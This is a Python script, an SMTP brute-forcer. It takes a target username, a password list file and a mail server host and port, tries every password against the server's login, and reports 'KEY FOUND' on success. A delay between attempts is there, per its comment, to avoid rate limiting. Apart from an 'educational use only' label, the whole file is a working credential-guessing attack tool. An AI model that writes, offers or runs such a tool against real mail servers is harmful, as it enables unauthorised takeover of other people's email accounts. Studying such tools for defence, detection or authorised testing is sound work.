import smtplib
import argparse
import time

def smtp_bruteforce(host, port, username, password_list):
    for password in password_list:
        try:
            # Connect to the SMTP server
            server = smtplib.SMTP(host, port, timeout=10)
            server.set_debuglevel(0)  # Set debug level to 0 for clean output
            server.starttls()  # Start TLS encryption

            # Try to log in with the username and password
            server.login(username, password)
            print(f"KEY FOUND [{password}]")
            server.quit()  # Close the connection
            return True  # Password found, exit function

        except smtplib.SMTPAuthenticationError:
            # If authentication fails, continue with the next password
            print(f"Failed login for {password}")
        except Exception as e:
            print(f"Error: {e}")
            break

        time.sleep(1)  # Add a slight delay between attempts to avoid rate limiting

    print("KEY NOT FOUND")
    return False  # No password found

def main():
    # Set up command-line argument parsing
    parser = argparse.ArgumentParser(description="SMTP Brute Forcer (For educational use only)")
    parser.add_argument("-l", "--username", required=True, help="Target username (email address)")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to the password list file")
    parser.add_argument("host", help="Target SMTP server (e.g., smtp.example.com)")
    parser.add_argument("port", type=int, help="SMTP server port (usually 25, 465, or 587)")

    # Parse arguments
    args = parser.parse_args()

    # Read password list from file
    try:
        with open(args.passwordlist, "r") as f:
            password_list = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"Error: Password list file '{args.passwordlist}' not found.")
        return

    # Run the brute force function
    smtp_bruteforce(args.host, args.port, args.username, password_list)

if __name__ == "__main__":
    main()
